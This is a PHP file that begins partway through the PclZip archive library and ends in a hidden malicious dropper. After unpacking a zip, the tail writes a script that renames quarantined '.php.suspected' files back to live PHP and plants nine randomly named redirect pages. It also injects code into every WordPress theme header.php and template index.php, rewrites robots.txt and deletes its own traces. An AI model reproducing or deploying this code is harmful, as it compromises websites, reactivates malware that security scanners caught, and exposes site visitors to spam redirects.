          unset($v_header_list);
          $v_temp_zip->privCloseFd();
          $this->privCloseFd();
          @unlink($v_zip_temp_name);

          return $v_result;
      }

      $v_temp_zip->privCloseFd();
      $this->privCloseFd();

      @unlink($this->zipname);

      PclZipUtilRename($v_zip_temp_name, $this->zipname);
  
      unset($v_temp_zip);
  }
  
  else if ($v_central_dir['entries'] != 0) {
      $this->privCloseFd();

      if (($v_result = $this->privOpenFd('wb')) != 1) {
        return $v_result;
      }

      if (($v_result = $this->privWriteCentralHeader(0, 0, 0, '')) != 1) {
        return $v_result;
      }

      $this->privCloseFd();
  }

  return $v_result;
}

function privDirCheck($p_dir, $p_is_dir=false)
{
  $v_result = 1;


  if (($p_is_dir) && (substr($p_dir, -1)=='/'))
  {
    $p_dir = substr($p_dir, 0, strlen($p_dir)-1);
  }

  if ((is_dir($p_dir)) || ($p_dir == ""))
  {
    return 1;
  }

  $p_parent_dir = dirname($p_dir);

  if ($p_parent_dir != $p_dir)
  {
    if ($p_parent_dir != "")
    {
      if (($v_result = $this->privDirCheck($p_parent_dir)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (!@mkdir($p_dir, 0777))
  {
    PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'");

    return PclZip::errorCode();
  }

  return $v_result;
}

function privMerge(&$p_archive_to_add)
{
  $v_result=1;

  if (!is_file($p_archive_to_add->zipname))
  {

    $v_result = 1;

    return $v_result;
  }

  if (!is_file($this->zipname))
  {

    $v_result = $this->privDuplicate($p_archive_to_add->zipname);

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  if (($v_result=$p_archive_to_add->privOpenFd('rb')) != 1)
  {
    $this->privCloseFd();

    return $v_result;
  }

  $v_central_dir_to_add = array();
  if (($v_result = $p_archive_to_add->privReadEndCentralDir($v_central_dir_to_add)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    return $v_result;
  }

  @rewind($p_archive_to_add->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_offset = @ftell($v_zip_temp_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_comment = $v_central_dir['comment'].' '.$v_central_dir_to_add['comment'];

  $v_size = @ftell($v_zip_temp_fd)-$v_offset;

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  if (($v_result = $this->privWriteCentralHeader($v_central_dir['entries']+$v_central_dir_to_add['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();
    @fclose($v_zip_temp_fd);
    $this->zip_fd = null;

    unset($v_header_list);

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();
  $p_archive_to_add->privCloseFd();

  @fclose($v_zip_temp_fd);

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privDuplicate($p_archive_filename)
{
  $v_result=1;

  if (!is_file($p_archive_filename))
  {

    $v_result = 1;

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  if (($v_zip_temp_fd = @fopen($p_archive_filename, 'rb')) == 0)
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive file \''.$p_archive_filename.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = filesize($p_archive_filename);
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  return $v_result;
}

function privErrorLog($p_error_code=0, $p_error_string='')
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclError($p_error_code, $p_error_string);
  }
  else {
    $this->error_code = $p_error_code;
    $this->error_string = $p_error_string;
  }
}

function privErrorReset()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclErrorReset();
  }
  else {
    $this->error_code = 0;
    $this->error_string = '';
  }
}

function privDisableMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

$this->magic_quotes_status = @get_magic_quotes_runtime();

if ($this->magic_quotes_status == 1) {
  @set_magic_quotes_runtime(0);
}

  return $v_result;
}

function privSwapBackMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

if ($this->magic_quotes_status == 1) {
	  @set_magic_quotes_runtime($this->magic_quotes_status);
}

  return $v_result;
}

}

function PclZipUtilPathReduction($p_dir)
{
  $v_result = "";

  if ($p_dir != "") {
    $v_list = explode("/", $p_dir);

    $v_skip = 0;
    for ($i=sizeof($v_list)-1; $i>=0; $i--) {
      if ($v_list[$i] == ".") {
      }
      else if ($v_list[$i] == "..") {
	  $v_skip++;
      }
      else if ($v_list[$i] == "") {
	  if ($i == 0) {
          $v_result = "/".$v_result;
	    if ($v_skip > 0) {
	        $v_result = $p_dir;
              $v_skip = 0;
	    }
	  }
	  else if ($i == (sizeof($v_list)-1)) {
          $v_result = $v_list[$i];
	  }
	  else {
	  }
      }
      else {
	  if ($v_skip > 0) {
	    $v_skip--;
	  }
	  else {
          $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
	  }
      }
    }
    
    if ($v_skip > 0) {
      while ($v_skip > 0) {
          $v_result = '../'.$v_result;
          $v_skip--;
      }
    }
  }

  return $v_result;
}

function PclZipUtilPathInclusion($p_dir, $p_path)
{
  $v_result = 1;
  
  if (   ($p_dir == '.')
      || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) {
    $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);
  }
  if (   ($p_path == '.')
      || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) {
    $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);
  }

  $v_list_dir = explode("/", $p_dir);
  $v_list_dir_size = sizeof($v_list_dir);
  $v_list_path = explode("/", $p_path);
  $v_list_path_size = sizeof($v_list_path);

  $i = 0;
  $j = 0;
  while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {

    if ($v_list_dir[$i] == '') {
      $i++;
      continue;
    }
    if ($v_list_path[$j] == '') {
      $j++;
      continue;
    }

    if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  {
      $v_result = 0;
    }

    $i++;
    $j++;
  }

  if ($v_result) {
    while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
    while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;

    if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) {
      $v_result = 2;
    }
    else if ($i < $v_list_dir_size) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)
{
  $v_result = 1;

  if ($p_mode==0)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==1)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==2)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==3)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }

  return $v_result;
}

function PclZipUtilRename($p_src, $p_dest)
{
  $v_result = 1;

  if (!@rename($p_src, $p_dest)) {

    if (!@copy($p_src, $p_dest)) {
      $v_result = 0;
    }
    else if (!@unlink($p_src)) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilOptionText($p_option)
{
  
  $v_list = get_defined_constants();
  for (reset($v_list); $v_key = key($v_list); next($v_list)) {
    $v_prefix = substr($v_key, 0, 10);
    if ((   ($v_prefix == 'PCLZIP_OPT')
         || ($v_prefix == 'PCLZIP_CB_')
         || ($v_prefix == 'PCLZIP_ATT'))
        && ($v_list[$v_key] == $p_option)) {
      return $v_key;
    }
  }
  
  $v_result = 'Unknown';

  return $v_result;
}

function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)
{
  if (stristr(php_uname(), 'windows')) {
    if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
        $p_path = substr($p_path, $v_position+1);
    }
    if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
        $p_path = strtr($p_path, '\\', '/');
    }
  }
  return $p_path;
}




$archive = new PclZip($foldername."/".$myfilename.".zip");
if ($archive->extract(PCLZIP_OPT_PATH, "$foldername") == 0) {
echo "Error : ".$archive->errorInfo(true);
}
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n";

$result = '<?php
ignore_user_abort();
set_time_limit(0);

$in = scandir(".");

foreach ($in as $inn)
{

if (strpos($inn, ".php.suspected"))
{
	$inn = explode(".", $inn);
	$inn = $inn[0];
	rename ($inn.".php.suspected", $inn.".php");
}

}



?>';

$z = fopen("$foldername/zzz.php", "w");
fwrite($z, $result);
fclose($z);

$filename = $foldername."/"."z2.txt";
$handle = fopen($filename, "r");
$redirect = fread($handle, filesize($filename));
fclose($handle);

unlink($foldername."/"."z2.txt");

$urls = array("1", "2", "3", "4", "5", "6", "7", "8", "9");

foreach ($urls as $url)
{
$u = chop($url);
$u = ucfirst($u);

$key = str_replace(" ", "+", $key);
  $let = array ("1","2","3","4","5","6","7","8","9","0","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m");    
$myname='';     
for ($ns=1;$ns<rand(8,8);$ns++)     
{     
$r = rand (0,count($let)-1);     
$myname .= $let[$r];     
}  
  
$out = fopen("$foldername/$myname.php", "w");
$redirect1 = str_replace("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", $u, $redirect);

fwrite($out, $redirect1);

fclose($out);


$outlink = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."/$foldername/$myname.php\n";
$outlink = str_replace("z1.php/", "", $outlink);
echo $outlink;
         ob_flush();
         flush();
}

$filename = $foldername."/"."zzzcode.txt";
$handle = fopen($filename, "r");
$code = fread($handle, filesize($filename));
fclose($handle);
unlink($foldername."/"."zzzcode.txt");

if (file_exists("wp-content"))
{
if (file_exists("wp-content/themes"))
{
	$dirs = scandir("wp-content/themes");
	foreach ($dirs as $dir)
	{
		if ((is_dir("wp-content/themes/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		{
			if (file_exists("wp-content/themes/$dir/header.php")) 
			{
		   				  $file = fopen("wp-content/themes/".$dir."/header.php", "r");  
                          $buffer = fread($file, filesize("wp-content/themes/".$dir."/header.php")); 
                          fclose($file);	
           if ((eregi('1.208.164', $buffer)==0))
               { 
				 
						 	$in = fopen("wp-content/themes/".$dir."/header.php", "w");
				             fwrite($in, $code);
			                 fwrite($in, $buffer);
				             fclose($in);
				/*		 
                   $in = fopen("wp-content/themes/$dir/header.php", "a");
				   fwrite($in, $code);
				   fclose($in);
				   */
               }
			}
		}
	}
}
}

if (file_exists("templates"))
{
	 $dirs = scandir("templates");
	 	foreach ($dirs as $dir)
	     {
		         if ((is_dir("templates/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		          {
					  if (file_exists("templates/".$dir."/index.php")) 
					  {
						  $file = fopen("templates/".$dir."/index.php", "r");  
                          $buffer = fread($file, filesize("templates/".$dir."/index.php")); 
                          fclose($file);	
         if ((eregi('1.208.164', $buffer)==0))
                                   {
					         $in = fopen("templates/".$dir."/index.php", "w");
				             fwrite($in, $code);
			                 fwrite($in, $buffer);
				             fclose($in);
 								   }									   
					  }
		          }
	     }
}

if (file_exists("robots.txt"))
{
$outht = fopen("robots.txt", "w");
fwrite($outht, "User-agent: *

Allow: /");
fclose($outht);
}

unlink("z1.php");

unlink($foldername."/".$myfilename.".zip");
$scriptname= str_replace("/", "", $_SERVER["SCRIPT_NAME"]);
@unlink($scriptname);